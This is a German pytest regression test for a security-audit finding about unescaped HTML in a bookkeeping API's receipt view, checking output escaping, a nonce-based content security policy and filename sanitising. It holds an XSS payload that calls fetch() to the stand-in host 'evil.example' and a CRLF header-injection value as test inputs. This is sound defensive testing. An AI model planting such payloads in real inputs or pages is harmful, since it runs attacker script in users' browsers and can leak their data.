"""
Regressionstest Security-Audit F3 (unescaptes HTML im Journal-Beleg).

Bug: get_beleg() setzte beschreibung, zahlungsart, belegnr und steuerbefreiung_grund per
f-String ungefiltert ins HTML. Die Beschreibung stammt beim Bank-Import u. a. aus dem
Verwendungszweck – den bestimmt, wer überweist. Ein Verwendungszweck wie
„<img src=x onerror=…>“ lief beim Öffnen des Belegs als Skript im API-Ursprung.
"""
from datetime import date
from decimal import Decimal

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from api.journal import get_beleg
from database.connection import Base
from database.models import Journaleintrag

ANGRIFF = '<img src=x onerror="fetch(\'http://evil.example/?1\')"><script>alert(1)</script>'


@pytest.fixture
def db():
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    session = sessionmaker(bind=engine)()
    yield session
    session.close()


def _eintrag(db, **felder) -> Journaleintrag:
    werte = dict(
        datum=date(2026, 11, 8), belegnr="B-1", art="Einnahme",
        beschreibung="Test", zahlungsart="Bank",
        netto_betrag=Decimal("1.00"), ust_satz=Decimal("0"), ust_betrag=Decimal("0"),
        brutto_betrag=Decimal("1.00"),
    )
    werte.update(felder)
    e = Journaleintrag(**werte)
    db.add(e)
    db.commit()
    return e


@pytest.mark.parametrize("feld", ["beschreibung", "zahlungsart", "belegnr", "steuerbefreiung_grund"])
def test_beleg_escaped_alle_textfelder(db, feld):
    e = _eintrag(db, **{feld: ANGRIFF})
    antwort = get_beleg(e.id, drucken=False, download=False, db=db)
    inhalt = antwort.body.decode()
    assert "<img" not in inhalt
    assert "<script>alert" not in inhalt
    assert "&lt;img src=x" in inhalt


def test_beleg_csp_erlaubt_nur_eigenes_druckskript(db):
    e = _eintrag(db, beschreibung=ANGRIFF)
    antwort = get_beleg(e.id, drucken=True, download=False, db=db)
    csp = antwort.headers["content-security-policy"]
    assert "default-src 'none'" in csp
    nonce = csp.split("'nonce-")[1].split("'")[0]
    inhalt = antwort.body.decode()
    assert f'<script nonce="{nonce}">' in inhalt
    assert "window.print()" in inhalt


def test_beleg_download_dateiname_bereinigt(db):
    e = _eintrag(db, belegnr='B"1\r\nX-Evil: 1')
    antwort = get_beleg(e.id, drucken=False, download=True, db=db)
    cd = antwort.headers["content-disposition"]
    assert "\n" not in cd and '"1' not in cd
    assert cd.startswith('attachment; filename="Beleg_')
